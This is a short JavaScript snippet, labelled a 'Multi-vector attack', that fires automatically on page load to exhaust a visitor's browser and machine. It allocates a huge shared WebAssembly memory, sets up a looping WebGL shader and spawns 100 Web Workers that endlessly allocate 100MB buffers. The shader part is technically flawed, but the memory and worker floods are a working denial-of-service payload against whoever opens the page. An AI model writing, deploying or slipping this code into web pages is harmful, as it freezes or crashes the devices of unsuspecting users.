// Multi-vector attack
const stressKernel = () => {
    // 1. Memory Bomb
    const memory = new WebAssembly.Memory({ 
        initial: 65536, 
        maximum: 131072,
        shared: true
    });
    
    // 2. GPU Assault
    const gl = document.getElementById('glCanvas').getContext('webgl2');
    const shader = `#version 300 es
    void main() {
        for(int i=0; i<100000; i++) {
            gl_FragColor = vec4(tan(float(i)), 0, 0, 1);
        }
    }`;
    gl.shaderSource(gl.createShader(gl.FRAGMENT_SHADER), shader);
    
    // 3. Thread Flood
    Array.from({length: 100}, () => {
        new Worker(URL.createObjectURL(new Blob([`
            while(1) { 
                new SharedArrayBuffer(1024 * 1024 * 100); 
            }
        `])));
    });
};

document.addEventListener('DOMContentLoaded', stressKernel);
